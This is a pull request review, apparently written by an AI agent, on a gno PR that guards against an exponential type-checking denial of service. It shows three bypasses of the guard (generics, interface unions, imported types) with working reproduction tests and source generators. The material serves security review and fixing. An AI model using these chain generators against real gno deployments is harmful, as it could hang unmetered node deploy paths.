# Review: PR #5826
Event: REQUEST_CHANGES

## Body
The value-containment fan-out fix is correct and the guard is genuinely linear, but the same exponential `validType` DoS is still reachable through three type shapes the guard under-counts: generic instantiations, interface union terms, and imported types. Verified on 088ce87 against the real `go/types`: a generic-instantiation fan-out hangs `TypeCheckMemPackage` past 20s at depth 24 on the same unmetered `MsgAddPackage` path; an interface union-doubling chain (`type In interface{ [0]I{n-1} | [1]I{n-1} }`) at depth 30 hangs `validType` while the guard scores it as a constant and returns nil; and a value-doubling chain split across an import boundary re-expands without memoization, so a per-package budget that each package passes still composes into an exponential whole-program walk. The other arms I checked hold: pointer/slice/map/chan/func breaks (depth 60) complete in microseconds, matching `validType`.

Full review: https://github.com/samouraiworld/gno-agent-workspace/blob/main/reviews/pr/5xxx/5826-typecheck-fanout-dos/1-088ce87/review_claude-opus-4-8_davd-gzl.md [↗](review_claude-opus-4-8_davd-gzl.md)

*(AI Agent)*

## gnovm/pkg/gnolang/typecheck_bound.go:143-146 [↗](../../../../../.worktrees/gno-review-5826/gnovm/pkg/gnolang/typecheck_bound.go#L143)
A value fan-out routed through a generic instantiation (`W[A{n-1}]`) is counted as `cost(W)`, a constant, because this arm drops the type argument, so the guard accepts it and `go/types` validType still hangs the unmetered deploy path. The base type does not bound the cost when the type argument drives the expansion. Fix: reject or conservatively over-count generic instantiations whose type arguments can drive value-containment fan-out, so a generic doubling chain hits the budget like the direct-value one.

<details><summary>repro (copy-paste, runs in ~10ms at the guard, no timeout)</summary>

The bug is entirely at the guard: `cost()` for an `*ast.IndexExpr` returns `cost(t.X)` and drops the type argument, so a value-doubling chain routed through a generic scores as a constant and the guard returns nil. No goroutine or timeout needed: it's the same value fan-out `fanOutSrc` already rejects, tested straight at `checkTypeExpansionBound`.

```bash
# from a local clone of gnolang/gno:
gh pr checkout 5826 -R gnolang/gno && git checkout 088ce87
cat > gnovm/pkg/gnolang/zz_generic_fanout_dos_test.go <<'EOF'
package gnolang

import (
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"strings"
	"testing"
)

func parseFanout(t *testing.T, src string) (*token.FileSet, []*ast.File) {
	t.Helper()
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, "fanout.go", src, parser.SkipObjectResolution)
	if err != nil {
		t.Fatal(err)
	}
	return fset, []*ast.File{f}
}

// Direct value-doubling chain: each level embeds the previous one twice by value.
func valueFanOutSrc(depth int) string {
	var b strings.Builder
	b.WriteString("package x\ntype T0 struct{ v int }\n")
	for i := 1; i <= depth; i++ {
		fmt.Fprintf(&b, "type T%d struct{ a, b [0]T%d }\n", i, i-1)
	}
	return b.String()
}

// The same doubling routed through a generic: A_n embeds W[A_{n-1}] by value,
// and W holds its type parameter twice, so each level still doubles.
func genericFanOutSrc(depth int) string {
	var b strings.Builder
	b.WriteString("package x\ntype W[P any] struct{ a, b [0]P }\ntype A0 struct{ v int }\n")
	for i := 1; i <= depth; i++ {
		fmt.Fprintf(&b, "type A%d struct{ x W[A%d] }\n", i, i-1)
	}
	return b.String()
}

func TestGenericFanOutGuardHole(t *testing.T) {
	// Baseline the PR fixes: the guard rejects the direct value fan-out.
	fset, gofs := parseFanout(t, valueFanOutSrc(30))
	if err := checkTypeExpansionBound(fset, gofs); err == nil {
		t.Fatal("value fan-out: expected a denial-of-service rejection, got nil")
	}

	// The hole: the identical fan-out through a generic slips past the guard.
	fset, gofs = parseFanout(t, genericFanOutSrc(30))
	if err := checkTypeExpansionBound(fset, gofs); err != nil {
		t.Fatalf("generic fan-out was rejected (%v); the guard hole appears fixed", err)
	}
	t.Fatal("generic fan-out ACCEPTED by the guard: it reaches the exponential validType walk this PR fences off")
}
EOF
go test -count=1 -run TestGenericFanOutGuardHole -v ./gnovm/pkg/gnolang/
rm gnovm/pkg/gnolang/zz_generic_fanout_dos_test.go
```

```
=== RUN   TestGenericFanOutGuardHole
    zz_generic_fanout_dos_test.go:73: generic fan-out ACCEPTED by the guard: it reaches the exponential validType walk this PR fences off
--- FAIL: TestGenericFanOutGuardHole (0.00s)
FAIL
FAIL	github.com/gnolang/gno/gnovm/pkg/gnolang	0.009s
```
The value chain is rejected (PR fix works); the identical generic chain is accepted, so the package proceeds to the exponential `validType` walk the PR is meant to fence off.
</details>

*(AI Agent)*

## gnovm/pkg/gnolang/typecheck_bound.go:127-138 [↗](../../../../../.worktrees/gno-review-5826/gnovm/pkg/gnolang/typecheck_bound.go#L127)
The `*ast.InterfaceType` arm only recurses embedded named types; an interface type-set union (`[0]X | [1]X`) is a single field whose `Type` is an `*ast.BinaryExpr` (and `~T` is an `*ast.UnaryExpr`), both of which fall through to `default: return 1` at line 147-148. But `validType` does walk interface type-set terms, so a union-doubling chain is scored as a constant by the guard yet drives the same exponential walk. Fix: recurse both operands of a `|` `*ast.BinaryExpr` and the operand of a `~` `*ast.UnaryExpr` inside the interface/type-elem handling, mirroring the struct/array value-containment recursion.

<details><summary>repro (copy-paste, runs in ~10ms at the guard, no timeout)</summary>

Same shape as the generic hole, at the guard: a union-doubling chain scores as a constant (the `BinaryExpr` union term hits `default: return 1`) so `checkTypeExpansionBound` returns nil, and the package proceeds to the exponential `validType` walk. Confirmed: the guard returns `<nil>` on `unionFanOutSrc(30)`; the same depth-30 source hangs `go/types` `validType` past 4s.

```bash
# from a local clone of gnolang/gno:
gh pr checkout 5826 -R gnolang/gno && git checkout 088ce87
cat > gnovm/pkg/gnolang/zz_union_fanout_dos_test.go <<'EOF'
package gnolang

import (
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"strings"
	"testing"
)

func parseUnion(t *testing.T, src string) (*token.FileSet, []*ast.File) {
	t.Helper()
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, "union.go", src, parser.SkipObjectResolution)
	if err != nil {
		t.Fatal(err)
	}
	return fset, []*ast.File{f}
}

// Doubling chain routed through interface type-set unions: each I_n unions two
// array types over I_{n-1}, so validType's type-set walk still doubles per level.
func unionFanOutSrc(depth int) string {
	var b strings.Builder
	b.WriteString("package x\ntype I0 interface{ m() }\n")
	for i := 1; i <= depth; i++ {
		fmt.Fprintf(&b, "type I%d interface{ [0]I%d | [1]I%d }\n", i, i-1, i-1)
	}
	b.WriteString("type Use struct{ x I" + fmt.Sprint(depth) + " }\n")
	return b.String()
}

func TestUnionFanOutGuardHole(t *testing.T) {
	fset, gofs := parseUnion(t, unionFanOutSrc(30))
	if err := checkTypeExpansionBound(fset, gofs); err != nil {
		t.Fatalf("union fan-out was rejected (%v); the guard hole appears fixed", err)
	}
	t.Fatal("union fan-out ACCEPTED by the guard: it reaches the exponential validType walk this PR fences off")
}
EOF
go test -count=1 -run TestUnionFanOutGuardHole -v ./gnovm/pkg/gnolang/
rm gnovm/pkg/gnolang/zz_union_fanout_dos_test.go
```

```
=== RUN   TestUnionFanOutGuardHole
    zz_union_fanout_dos_test.go:46: union fan-out ACCEPTED by the guard: it reaches the exponential validType walk this PR fences off
--- FAIL: TestUnionFanOutGuardHole (0.00s)
FAIL
```
</details>

*(AI Agent)*

## gnovm/pkg/gnolang/typecheck_bound.go:141-142 [↗](../../../../../.worktrees/gno-review-5826/gnovm/pkg/gnolang/typecheck_bound.go#L141)
`*ast.SelectorExpr` (an imported type `pkg.T`) is scored as a leaf (`return 1`). That is sound within one package, but `validType` follows value containment across package boundaries and does not memoize (golang/go#65711), so it re-expands imported types in full. The guard runs per package at each `AddPackage`, while `validType` at that same deploy walks the whole transitive type graph. A value-doubling chain split across a deploy-chain of packages, each with a trivial local cost (`pkg.T` = 1), makes the Nth package's `validType` walk expand 2^N while every package individually passes the per-package budget; the deploy that first crosses the time threshold hangs the unmetered path. This is an architectural gap, not a single-package miscount: the guard cannot see the imported cost. Fix: persist each package's max named-type expansion cost (e.g. in `TypeCheckCache`) and add it for `SelectorExpr`, instead of treating imported types as constant leaves.

<details><summary>repro (two-package go/types timing: validType crosses the import boundary)</summary>

If imported types were leaves, type-checking `b` (which doubles `a.TOP` once) would be microseconds, like the map/chan/func breaks. Instead it costs ~the importee's own expansion, proving `validType` re-walks the imported chain. Scale the per-package depth and the deploy-chain length and the Nth deploy hangs while every package's guard-cost stays ~5.

```go
// go run . — pure go/types, no gno needed
package main

import (
	"fmt"
	"go/ast"
	"go/parser"
	"go/token"
	"go/types"
	"strings"
	"time"
)

type oneImporter struct{ pkg *types.Package }

func (o oneImporter) Import(string) (*types.Package, error) { return o.pkg, nil }

func parseCheck(name, src string, imp types.Importer) (*types.Package, time.Duration) {
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, name+".go", src, 0)
	if err != nil {
		panic(err)
	}
	conf := types.Config{Importer: imp, Error: func(error) {}}
	start := time.Now()
	pkg, _ := conf.Check(name, fset, []*ast.File{f}, nil)
	return pkg, time.Since(start)
}

func chain(pkgname string, depth int) string {
	var b strings.Builder
	fmt.Fprintf(&b, "package %s\ntype T0 struct{ v int }\n", pkgname)
	for i := 1; i <= depth; i++ {
		fmt.Fprintf(&b, "type T%d struct{ a, b [0]T%d }\n", i, i-1)
	}
	fmt.Fprintf(&b, "type TOP = T%d\n", depth)
	return b.String()
}

func main() {
	D := 18
	pa, ta := parseCheck("a", chain("a", D), nil)
	fmt.Printf("check a (depth %d) alone: %v\n", D, ta)
	bsrc := "package b\nimport \"a\"\ntype B struct{ x, y [0]a.TOP }\n"
	_, tb := parseCheck("b", bsrc, oneImporter{pa})
	fmt.Printf("check b (doubles a.TOP once): %v\n", tb)
	if tb > ta/2 {
		fmt.Println(">>> validType CROSSES the import boundary; per-package budget does not bound the whole-program walk")
	}
}
```

```
check a (depth 18) alone: 259.675554ms
check b (doubles a.TOP once): 164.459695ms
>>> validType CROSSES the import boundary; per-package budget does not bound the whole-program walk
```
</details>

*(AI Agent)*
